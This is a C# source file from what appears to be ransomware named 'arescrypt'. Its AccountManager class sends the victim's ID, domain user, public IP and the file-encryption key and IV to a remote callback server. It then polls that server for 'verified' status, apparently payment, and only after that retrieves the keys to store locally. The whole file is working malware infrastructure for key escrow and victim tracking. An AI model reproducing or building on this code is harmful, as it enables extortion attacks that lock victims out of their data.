﻿using System;
using System.Net;
using Newtonsoft.Json.Linq;
using System.Collections.Generic;

namespace arescrypt
{
    class AccountManager
    {
        private UserData userData = new UserData();

        public bool CheckVerification()
        {
            string url = Configuration.callbackURL + 
                "?uniqueKey=" + userData.getUniqueKey() +
                "&userDomUser=" + Configuration.userDomUser;

            using (WebClient wc = new WebClient())
            {
                try
                {
                    string response = wc.DownloadString(url);
                    JToken jsonObject = JObject.Parse(response);
                    return (bool)jsonObject.SelectToken("verifiedAccount");
                }
                catch (WebException exc)
                { Console.WriteLine("Caught exception: " + exc.Message); return false; }
            }
        }

        public bool CreateUser()
        {
            string userIPAddr = Miscellaneous.GetPublicIPAddress();
            string userParams = "uniqueKey=" + userData.getUniqueKey() +
                "&userDomUser=" + Configuration.userDomUser +
                "&userIPAddr=" + userIPAddr +
                "&encKey=" + Convert.ToBase64String(Cryptography.encKey).Replace(" ", "+") +
                "&encIV=" + Convert.ToBase64String(Cryptography.encIV).Replace(" ", "+");
            
            using (WebClient wc = new WebClient())
            {
                wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                try
                {
                    string response = wc.UploadString(Configuration.callbackURL, userParams);

                    JToken jsonObject = JObject.Parse(response);
                    return (bool)jsonObject.SelectToken("creationSuccess");
                } catch (Exception exc)
                { Console.WriteLine("Caught exception: " + exc.Message); return false; }
            }
        }

        public UserData GetCryptoKeys()
        {   // This method ONLY needs to be called when it has been determined that the account has been verified properly.

            string url = Configuration.callbackURL +
                "?uniqueKey=" + userData.getUniqueKey() +
                "&userDomUser=" + Configuration.userDomUser;

            using (WebClient wc = new WebClient())
            {
                try
                {
                    string response = wc.DownloadString(url);
                    JToken jsonObject = JObject.Parse(response);
                    if((bool)jsonObject.SelectToken("verifiedAccount")) // The account has been verified.
                    {
                        userData = Miscellaneous.GetDATFileData();

                        userData.encKey = (string)jsonObject.SelectToken("encKey");
                        userData.encIV = (string)jsonObject.SelectToken("encIV");

                        Miscellaneous.SetDATFileData(userData);
                    }
                }
                catch (WebException exc)
                { Console.WriteLine("Caught exception: " + exc.Message); return userData; }
            }

            return Miscellaneous.GetDATFileData();
        }
        
    }
}
